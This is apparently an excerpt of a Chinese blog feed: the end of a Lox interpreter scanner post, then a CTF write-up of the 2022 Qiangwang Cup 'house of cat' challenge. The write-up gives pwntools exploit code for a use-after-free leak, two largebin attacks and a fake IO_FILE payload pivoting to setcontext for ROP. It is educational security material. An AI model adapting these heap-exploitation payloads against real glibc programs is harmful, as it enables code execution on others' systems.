class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (isAlpha(c)) &#123;</span><br><span class="line">          identifier();</span><br></pre></td></tr></table></figure><p>也就是如果识别到一个字符，就调用<code>identifier()</code>。</p><p>实现如下，也就是一直获取字符直到字符的结尾。并添加一个token，类别是identidier。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">identifier</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (isAlphaNumeric(peek())) advance();</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> source.substring(start, current);</span><br><span class="line">    <span class="type">TokenType</span> <span class="variable">type</span> <span class="operator">=</span> keywords.get(text);</span><br><span class="line">    <span class="keyword">if</span> (type == <span class="literal">null</span>) type = IDENTIFIER;</span><br><span class="line">    addToken(type);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中isAlphaNumeric就是判断下一个字符是不是数字或者大小写字母。之后我们去逐个匹配这个字符单词是不是我们的保留字符。如果不是九将其type设置为IDENTIFIER，否则添加相应的type即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Map&lt;String, TokenType&gt; keywords;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">  keywords = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">  keywords.put(<span class="string">&quot;and&quot;</span>,    AND);</span><br><span class="line">  keywords.put(<span class="string">&quot;class&quot;</span>,  CLASS);</span><br><span class="line">  keywords.put(<span class="string">&quot;else&quot;</span>,   ELSE);</span><br><span class="line">  keywords.put(<span class="string">&quot;false&quot;</span>,  FALSE);</span><br><span class="line">  keywords.put(<span class="string">&quot;for&quot;</span>,    FOR);</span><br><span class="line">  keywords.put(<span class="string">&quot;fun&quot;</span>,    FUN);</span><br><span class="line">  keywords.put(<span class="string">&quot;if&quot;</span>,     IF);</span><br><span class="line">  keywords.put(<span class="string">&quot;nil&quot;</span>,    NIL);</span><br><span class="line">  keywords.put(<span class="string">&quot;or&quot;</span>,     OR);</span><br><span class="line">  keywords.put(<span class="string">&quot;print&quot;</span>,  PRINT);</span><br><span class="line">  keywords.put(<span class="string">&quot;return&quot;</span>, RETURN);</span><br><span class="line">  keywords.put(<span class="string">&quot;super&quot;</span>,  SUPER);</span><br><span class="line">  keywords.put(<span class="string">&quot;this&quot;</span>,   THIS);</span><br><span class="line">  keywords.put(<span class="string">&quot;true&quot;</span>,   TRUE);</span><br><span class="line">  keywords.put(<span class="string">&quot;var&quot;</span>,    VAR);</span><br><span class="line">  keywords.put(<span class="string">&quot;while&quot;</span>,  WHILE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就基本完成了我们对输入一行内容的词法分析，分类。</p><p><img src="/2022/08/04/crafting-interpreters2/image-20220804145726428.png" alt="image-20220804145726428"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>总结一下这一部分内容：我们把得到的输入按照每行进行处理，分为几种类别</p><ol><li>运算符，特征为直接switch case识别</li><li>字符串，特征为” “</li><li>数字，特征为数字开头，数字结尾</li><li>保留字符，特征为直接使用hashmap匹配</li></ol><p> 每一种识别到的内容，都将他们放入一个向量中，向量里面有四种数据类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Token(TokenType type, String lexeme, Object literal, <span class="type">int</span> line) &#123;</span><br><span class="line">    <span class="built_in">this</span>.type = type; <span class="comment">//比方说string，变量类型</span></span><br><span class="line">    <span class="built_in">this</span>.lexeme = lexeme; <span class="comment">// 直接substr()下的数值</span></span><br><span class="line">    <span class="built_in">this</span>.literal = literal; <span class="comment">// 字面数值,对于字符串，就是去掉引号的部分</span></span><br><span class="line">    <span class="built_in">this</span>.line = line;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到此完成了scanning和lox基本语法的介绍</p>]]></content>
      
      
      <categories>
          
          <category> interpreter </category>
          
      </categories>
      
      
        <tags>
            
            <tag> interpreter </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>house-of-cat</title>
      <link href="/2022/08/02/house-of-cat/"/>
      <url>/2022/08/02/house-of-cat/</url>
      
        <content type="html"><![CDATA[<p>2022强网杯的house of cat。高版本下UAF的直接利用。看了很多wp发现在高版本下，基本所有攻击都聚焦于FSOP方向了。看来这才是大势所趋。</p><p>注意到前几天dice_hope也有一个一模一样的题，简单做法是改libc的got表为system，也可以FSOP泄露一个栈地址来劫持返回地址。但是这道题开了沙箱，也就是只能用第二种方法了。</p><p>着重参考<a href="https://bbs.pediy.com/thread-273895.htm#msg_header_h2_4">看雪链接-house of cat</a></p><span id="more"></span><h1 id="house-of-cat攻击手法"><a href="#house-of-cat攻击手法" class="headerlink" title="house of cat攻击手法"></a>house of cat攻击手法</h1><p>目前这种攻击手法适用于任何版本。包括最新的2.35.其利用条件为</p><ol><li>能够任意写一个可控地址</li><li>能够泄露堆地址和libc基址</li><li>能够触发IO流（FSOP或触发__malloc_assert），执行IO相关函数</li></ol><p>本质上来说FSOP的核心还是可控地址写一个可控数据，之后再FSOP的作用下完成调用vtable里面的函数，完成的攻击。</p><p>注意vtable在glibc2.24之后就有了地址检查，也就是判断vtable整体位置。防止伪造整个vtable。这也就直接导致了house of orange在2.23之后的版本中无法使用。以下是具体的检查代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> _IO_vtable_check (<span class="type">void</span>) attribute_hidden;</span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *</span><br><span class="line"><span class="title function_">IO_validate_vtable</span> <span class="params">(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables -__start___libc_IO_vtables;</span><br><span class="line">  <span class="type">uintptr_t</span> ptr = (<span class="type">uintptr_t</span>) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr -(<span class="type">uintptr_t</span>)__start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体看看是怎么检查的。可以看到第七行是检查当前vtable和libc的vtable开始地址之间的偏移，如果大于一个预定好的大小范围久做更细致的vtable检查。也就是说我们难以伪造整个vtable。但是对于其中的函数指针检查还是相对宽松的。因此我们可以通过改vtable中的函数指针来执行函数。</p><p>我们这里修改的函数为<code>_IO_WOVERFLOW</code>。可以具体看一下它的代码和汇编代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7f4cae745d30</span> &lt;_IO_switch_to_wget_mode&gt;       endbr64</span><br><span class="line">  <span class="number">0x7f4cae745d34</span> &lt;_IO_switch_to_wget_mode+<span class="number">4</span>&gt;     mov    rax, qword ptr [rdi + <span class="number">0xa0</span>]</span><br><span class="line">  <span class="number">0x7f4cae745d3b</span> &lt;_IO_switch_to_wget_mode+<span class="number">11</span>&gt;    push   rbx</span><br><span class="line">  <span class="number">0x7f4cae745d3c</span> &lt;_IO_switch_to_wget_mode+<span class="number">12</span>&gt;    mov    rbx, rdi</span><br><span class="line">  <span class="number">0x7f4cae745d3f</span> &lt;_IO_switch_to_wget_mode+<span class="number">15</span>&gt;    mov    rdx, qword ptr [rax + <span class="number">0x20</span>]</span><br><span class="line">  <span class="number">0x7f4cae745d43</span> &lt;_IO_switch_to_wget_mode+<span class="number">19</span>&gt;    cmp    rdx, qword ptr [rax + <span class="number">0x18</span>]</span><br><span class="line">  <span class="number">0x7f4cae745d47</span> &lt;_IO_switch_to_wget_mode+<span class="number">23</span>&gt;    jbe    _IO_switch_to_wget_mode+<span class="number">56</span>                &lt;_IO_switch_to_wget_mode+<span class="number">56</span>&gt;</span><br><span class="line"> </span><br><span class="line">  <span class="number">0x7f4cae745d49</span> &lt;_IO_switch_to_wget_mode+<span class="number">25</span>&gt;    mov    rax, qword ptr [rax + <span class="number">0xe0</span>]</span><br><span class="line">  <span class="number">0x7f4cae745d50</span> &lt;_IO_switch_to_wget_mode+<span class="number">32</span>&gt;    mov    esi, <span class="number">0xffffffff</span></span><br><span class="line">  <span class="number">0x7f4cae745d55</span> &lt;_IO_switch_to_wget_mode+<span class="number">37</span>&gt;    call   qword ptr [rax + <span class="number">0x18</span>]</span><br></pre></td></tr></table></figure><p>这里的汇编源代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以从上面的汇编中很清楚的看到以下关键的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x7f4cae745d34 &lt;_IO_switch_to_wget_mode+4&gt;     mov    rax, qword ptr [rdi + 0xa0]</span><br><span class="line">0x7f4cae745d3f &lt;_IO_switch_to_wget_mode+15&gt;    mov    rdx, qword ptr [rax + 0x20]</span><br><span class="line">0x7f4cae745d43 &lt;_IO_switch_to_wget_mode+19&gt;    cmp    rdx, qword ptr [rax + 0x18]</span><br><span class="line">0x7f4cae745d49 &lt;_IO_switch_to_wget_mode+25&gt;    mov    rax, qword ptr [rax + 0xe0]</span><br><span class="line">0x7f4cae745d55 &lt;_IO_switch_to_wget_mode+37&gt;    call   qword ptr [rax + 0x18]</span><br></pre></td></tr></table></figure><p><strong>这里的寄存器rdi（fake_IO的地址）、rax和rdx都是我们可以控制的，在开启沙箱的情况下，假如把最后调用的[rax +  0x18]设置为setcontext，把rdx设置为可控的堆地址，就能执行srop来读取flag；如果未开启沙箱，则只需把最后调用的[rax + 0x18]设置为system函数，把fake_IO的头部写入/bin/sh字符串，就可执行system(“/bin/sh”)</strong></p><p>下面看一下house of cat的模板</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">fake_io_addr=heapbase+<span class="number">0xb00</span></span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_IO_FILE=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">1</span>)+p64(<span class="number">0</span>)<span class="comment">#</span></span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0xb0</span>)<span class="comment">#_IO_backup_base=setcontext_rdx</span></span><br><span class="line">fake_IO_FILE +=p64(setcontext+<span class="number">61</span>)<span class="comment">#_IO_save_end=call addr(call setcontext)</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x58</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heapbase+<span class="number">0x1000</span>)  <span class="comment"># _lock = a writable address</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x90</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0x30</span>)<span class="comment">#_wide_data,rax1_addr</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xB0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _mode = 0</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xC8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libcbase+<span class="number">0x2160c0</span>+<span class="number">0x10</span>)  <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x40</span>)  <span class="comment"># rax2_addr</span></span><br></pre></td></tr></table></figure><h1 id="house-of-cat题目"><a href="#house-of-cat题目" class="headerlink" title="house of cat题目"></a>house of cat题目</h1><p>这里就选择2022强网杯pwn里面的house of cat作为例子。这也是解出人数最多的一个pwn题目。</p><p>首先看看这题是存在沙箱保护的。并且限制了文件描述符只能为0.</p><p><img src="/2022/08/02/house-of-cat/image-20220802150240535.png" alt="image-20220802150240535"></p><p>这道题给我们的条件是可以分配大小为size &lt;= 0x417 || size &gt; 0x46F的chunk，最多分配16个，可以edit两次，并且每次只能修改30字节。free的时候<strong>存在UAF</strong>。另外还有show()函数。</p><p>首先这道题需要逆一下怎么输入能够通过输入条件的检验，我比赛的时候就卡在这个地方就卡了两个小时。。。输入的结构是这样的</p><blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LOGIN | r00t QWB QWXFadmin</span><br><span class="line">CAT | r00t QWB QWXF$\xff</span><br></pre></td></tr></table></figure></blockquote><p>之后就可以类似堆题一样，做上述的四种操作。</p><h2 id="step1-泄露地址"><a href="#step1-泄露地址" class="headerlink" title="step1 泄露地址"></a>step1 泄露地址</h2><p>完成上述的FSOP我们首先需要泄露堆地址和libc地址。由于UAF，这两者泄露比较容易。堆地址可以直接从largebin中拿到，而堆地址需要建立两个largebin的group，之后一并输出就能拿到一个包含下一个largebin group地址的chunk，也就能拿到堆地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">input_str1 = <span class="string">b&quot;LOGIN | r00t QWB QWXFadmin&quot;</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;mew mew mew~~~~~~&#x27;</span>,input_str1)</span><br><span class="line">input_str2 = <span class="string">b&quot;CAT | r00t QWB QWXF$\xff&quot;</span> <span class="comment"># replace admin with command</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;mew mew mew~~~~~~&#x27;</span>,input_str2)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x420</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">io.sendafter(<span class="string">&#x27;mew mew mew~~~~~~&#x27;</span>,input_str2)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x430</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">io.sendafter(<span class="string">&#x27;mew mew mew~~~~~~&#x27;</span>,input_str2)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x418</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">io.sendafter(<span class="string">&#x27;mew mew mew~~~~~~&#x27;</span>,input_str2)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># io.sendafter(&#x27;mew mew mew~~~~~~&#x27;,input_str2)</span></span><br><span class="line"><span class="comment"># add(0,0x420,&#x27;aaaaaaaa&#x27;)</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;mew mew mew~~~~~~&#x27;</span>,input_str2)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_info = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;libc_info: &quot;</span> + <span class="built_in">hex</span>(libc_info))</span><br><span class="line">libc_base = libc_info - <span class="number">0x219ce0</span></span><br><span class="line">success(<span class="string">&quot;libc_base; &quot;</span>+ <span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;mew mew mew~~~~~~&#x27;</span>,input_str2)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x440</span>,<span class="string">&#x27;d&#x27;</span>) <span class="comment"># alloc a next largebin group</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;mew mew mew~~~~~~&#x27;</span>,input_str2)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap_info = u64(io.recvuntil(<span class="string">&#x27;\x55&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;heap_info: &quot;</span> + <span class="built_in">hex</span>(heap_info))</span><br><span class="line">heap_base = heap_info - <span class="number">0x000290</span></span><br><span class="line">success(<span class="string">&quot;heap_base: &quot;</span> + <span class="built_in">hex</span>(heap_base))</span><br></pre></td></tr></table></figure><h2 id="step2-largebin-attack"><a href="#step2-largebin-attack" class="headerlink" title="step2 largebin attack"></a>step2 largebin attack</h2><p>关于largebin attack的细节可以参考<a href="https://nicholas-wei.github.io/2022/01/29/largebin-attack/#glibc2-31">我之前学习的文章</a>。注意在2.31之后对于largebin的利用也有一些变化。这里就要利用最后一种方式。</p><p>可以看到程序给了我们两个edit的机会。第一次：我们要用largebin attack改掉libc中stderr的指针，改向一个chunk，里面是伪造的FILE table。第二次：我们要用largebin attack改掉top chunk的size，从而触发malloc_assert的IO流错误。回顾一下largebin attack在2.31之后的利用手段，总结如下。</p><blockquote><p>分配两个chunk，他们两个大小需要在一个largebin范围内，但是不能相同(例如0x418和0x428)。记小的chunk为A，大的为B。</p><p>首先free(B)，B会进入unsorted bin，之后add一个更大的块，将B放入largebin中。</p><p>修改B的bk_nextsize为target-0x20。</p><p>释放A，A进入unsortedbin</p><p>add一个更大的块，让A进入largebin。此时target中就会被写上A所在的地址。</p></blockquote><p>如果把target写成stderr，A中布置好一个fake IO_FILE结构体，那么就可以完成一次FSOP。</p><h3 id="第一次攻击"><a href="#第一次攻击" class="headerlink" title="第一次攻击"></a>第一次攻击</h3><p>我们首先来看这道题已经对堆做的相关操作。（也就是到后面泄露堆为止的操作）</p><table><thead><tr><th>操作</th><th>index</th><th>大小</th></tr></thead><tbody><tr><td>add</td><td>0</td><td>0x420</td></tr><tr><td>add</td><td>1</td><td>0x430</td></tr><tr><td>add</td><td>2</td><td>0x418</td></tr><tr><td>delete</td><td>0</td><td>0x420</td></tr><tr><td>add</td><td>3</td><td>0x440</td></tr></tbody></table><p>现在0在largebin中，我们第一步就是修改0号chunk的next_size部分为target-0x20。这里设置为stderr-0x20即可。</p><p>之后我们将2释放，也就是delete(2)，现在chunk2就在unsortedbin中。我们申请一个大的块，将2放入largebin，就能完成这次的攻击。具体的代码如下。这里一开始变成了delete(6)，是一样的，先把2取出来给6，因此2和6相同了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">6</span>,<span class="number">0x418</span>,payload1) <span class="comment"># 申请一个比原先chunk小的块，但是要在一个size map里面</span></span><br><span class="line">delete(<span class="number">6</span>) <span class="comment"># 删掉chunk6，进入unsortedbin</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># largebin attack，修改bk_nextsize</span></span><br><span class="line">edit(<span class="number">0</span>,p64(libc_base+<span class="number">0x21a0d0</span>)*<span class="number">2</span> + p64(heap_base+<span class="number">0x290</span>) + p64(stderr-<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x440</span>,<span class="string">&#x27;aaaaa&#x27;</span>) <span class="comment"># 使得chunk6从unsortedbin进入largebin</span></span><br></pre></td></tr></table></figure><h3 id="第二次攻击"><a href="#第二次攻击" class="headerlink" title="第二次攻击"></a>第二次攻击</h3><p>第二次攻击的目标是top chunk的size字段。方法和之前类似。不过现在的target address变成了堆的基地址加上一个偏移量。代码如下所示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">8</span>,<span class="number">0x430</span>,<span class="string">&#x27;eee&#x27;</span>) <span class="comment"># 小的chunk</span></span><br><span class="line">delete(<span class="number">5</span>) <span class="comment"># 删除5，则5进入unsortedbin</span></span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x450</span>,p64(<span class="number">0</span>)+p64(<span class="number">1</span>)) <span class="comment"># put 5 into largebin</span></span><br><span class="line">delete(<span class="number">8</span>) <span class="comment"># 删除8，现在8在unsortedbin中</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># largebin attack，修改bk_nextsize为top chunk的size部分，想要写入一个大数作为生意空间，引起报错，其余尽量保持不变。</span></span><br><span class="line">edit(<span class="number">5</span>,p64(libc_base+<span class="number">0x21a0e0</span>)*<span class="number">2</span>+p64(heap_base+<span class="number">0x1370</span>)+p64(heap_base+<span class="number">0x28e0</span>-<span class="number">0x20</span>+<span class="number">3</span>))</span><br></pre></td></tr></table></figure><p>此时如果我们再去add一个大块，将会触发以下内容</p><ol><li>对unsortedbin进行检查，将小的chunk放到largebin</li><li>触发largebin attack，修改top chunk的size</li><li>分配一个块的时候触发top chunk size的检查，触发FSOP。而此时stderr正是我们在第一次攻击中布置好的伪造的chunk。此时通过chunk中不同位置判断条件触发<code>_IO_switch_to_wget_mode</code>在跳转到<code>setcontext</code>就可以完成攻击了。</li></ol><h2 id="step3-setcontext"><a href="#step3-setcontext" class="headerlink" title="step3 setcontext"></a>step3 setcontext</h2><p>由于这道题存在沙箱，我们需要使用set_context+0x3d。具体使用方法是找到libc中的如下函数。蓝色框中的位置</p><p><img src="/2022/08/02/house-of-cat/image-20220803190420908.png" alt="image-20220803190420908"></p><p>跳转到的位置</p><p><img src="/2022/08/02/house-of-cat/image-20220803190452900.png" alt="image-20220803190452900"></p><p>因此我们可以将rdx+0xa8作为ROP的开始，后面这个地址将作为新的栈顶指针。之后布置一系列寄存器作为参数传递。当然在我们已经拿到libc之后，也不用管理参数，后面ROP自行修改即可。</p><h2 id="构造ROP和FILE"><a href="#构造ROP和FILE" class="headerlink" title="构造ROP和FILE"></a>构造ROP和FILE</h2><h3 id="伪造FILE"><a href="#伪造FILE" class="headerlink" title="伪造FILE"></a>伪造FILE</h3><p>这里是这道题最难的地方。我们怎么构造伪造的FILE结构体，布置好参数，跳转到set context执行命令呢？我们重点分析以下payload，这是fake file的具体内容。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">fake_IO_FILE = p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>) <span class="comment"># heap_base+0xb30，rax1</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>) </span><br><span class="line">fake_IO_FILE +=p64(<span class="number">1</span>)+p64(<span class="number">0</span>) <span class="comment"># rax2</span></span><br><span class="line">fake_IO_FILE +=p64(heap_base+<span class="number">0xc18</span>-<span class="number">0x68</span>) <span class="comment"># rdx</span></span><br><span class="line">fake_IO_FILE +=p64(setcontext+<span class="number">61</span>)<span class="comment"># call addr, here is [rax+0x18]</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x58</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span> )  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0x200</span>)  <span class="comment"># _lock = writable address</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE +=p64(heap_base+<span class="number">0xb30</span>)*<span class="number">2</span> <span class="comment">#rax1</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xB0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _mode = 0</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xC8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libc_base+<span class="number">0x2160d0</span>)  <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0xb30</span>+<span class="number">0x10</span>)  <span class="comment"># rax2  rax+0xe0</span></span><br><span class="line">flag_addr = heap_base + <span class="number">0x17d0</span></span><br><span class="line">payload1 = fake_IO_FILE + p64(flag_addr) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)*<span class="number">5</span>+p64(heap_base+<span class="number">0x2050</span>)+p64(ret)</span><br></pre></td></tr></table></figure><p>结合以下汇编分析。回忆一下我们首先通过一些flags的位置变化来让stderr执行到这个函数。此时我们只有<code>rdi</code>是可控的。<code>rdi</code>也就是这个fake file的指针。指向一开始的四个p64(0)。</p><p><img src="/2022/08/02/house-of-cat/image-20220803204441077.png" 